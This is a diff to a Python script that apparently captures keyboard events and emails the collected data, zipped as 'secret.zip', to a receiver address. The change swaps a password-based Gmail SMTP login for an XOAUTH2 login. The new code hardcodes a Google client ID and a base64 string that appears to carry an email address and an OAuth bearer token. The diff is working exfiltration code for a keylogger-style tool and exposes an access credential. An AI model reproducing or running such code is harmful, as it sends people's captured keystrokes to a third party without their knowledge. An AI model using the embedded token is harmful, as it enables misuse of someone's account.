@@ -59,6 +59,7 @@ def before_send_after():
     os.remove(zip_path)
 
 
+
 def send_email():
     # send ZIP to email
     global E_ADDRESS, E_PASSWORD, RECEIVER
@@ -82,10 +83,21 @@ def send_email():
                         'attachment', filename="secret.zip")
     msg.attach(file_msg)
 
-    s = smtplib.SMTP_SSL(host='smtp.gmail.com', port=465)
-    s.login(user=E_ADDRESS, password=E_PASSWORD)
-    s.sendmail(E_ADDRESS, RECEIVER, msg.as_string())
-    s.quit()
+    # s = smtplib.SMTP_SSL(host='smtp.gmail.com', port=465)
+    # s.login(user=E_ADDRESS, password=E_PASSWORD)
+    # s.sendmail(E_ADDRESS, RECEIVER, msg.as_string())
+    
+    GOOGLE_CLIENT_ID = '469586149781-vgbvdvnh8b0rpo9kh8ds1tl2jfnhqpa1.apps.googleusercontent.com'
+    auth_string = "dXNlcj0JYS52ZXJ5LmNhc3VhbC5lbWFpbEBnbWFpbC5jb20BYXV0aD1CZWFyZXIgeWEyOS5BMEFWQTl5MXU0cERIcGFJS0xPNDBUZ2RXaDlUbmQ3NWFiU3IwMVRHX2tDNWRMMGpuelBlUnBIU2pZVk92bmFIczZhRXdLMVBMTFRlcjFLc1BjUXVGYkYyREcwZ1JsQTFBbUZNNW5oNWNDTUxMbWNMemtNSVg4ckhXdWVvdW1JaHBHRDJObDhtZkh1aHYyNGNzX3VMY3pBbk9BSWZJNFlVTm5XVXRCVkVGVFFWUkJVMFpSUlRZMVpISTRRbEpRWVhKU2VpMW9kWFZXYmxwSE1reHBaM2x5ZHcwMTYzAQE="
+    
+    server = smtplib.SMTP('smtp.gmail.com:587')
+    server.ehlo(GOOGLE_CLIENT_ID)
+    server.starttls()
+    server.docmd('AUTH', 'XOAUTH2 ' + auth_string)
+    server.sendmail(E_ADDRESS, RECEIVER, msg.as_string())
+    server.quit()
+    
+    # s.quit()
 
 
 def KBevent(event):
